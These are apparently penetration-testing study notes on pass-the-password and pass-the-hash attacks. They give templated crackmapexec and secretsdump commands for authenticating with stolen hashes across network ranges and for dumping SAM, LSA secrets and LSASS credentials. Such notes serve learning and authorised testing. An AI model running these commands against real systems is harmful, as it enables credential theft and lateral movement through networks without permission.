What are pass attacks? (Pass the Password/Pass the Hash)

If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks

![[Pasted image 20240828172033.png]]

We will primarily use a tool called crackmapexec whose syntax will look something like this:

```
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
```

![[Pasted image 20240828172250.png]]

Lets say we have some hashes that we got from metasploit after running hashdump

![[Pasted image 20240828172414.png]]

 Or we can use a tool called secretsdump like so:

```
secretsdump.py <DC>/<user>:<password> @ <ip_of_DC>
```

We can then use crackmapexec to pass the hash as well by this command:

```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth
```

![[Pasted image 20240828172648.png]]

We can additionally use crackmapexec to dump valuable data:

```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam (or --shares, --lsa)
```

![[Pasted image 20240828172805.png]]

It even has built in modules...

```
crackmapexec smb -L
```

![[Pasted image 20240828172932.png]]

For example, we can dump the lsass with lsassy

```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy
```

![[Pasted image 20240828173043.png]]

There is also a database for crackmapexec which tells you how many attempts a user has made to login and stuff

```
cmedb
```

![[Pasted image 20240828173156.png]]

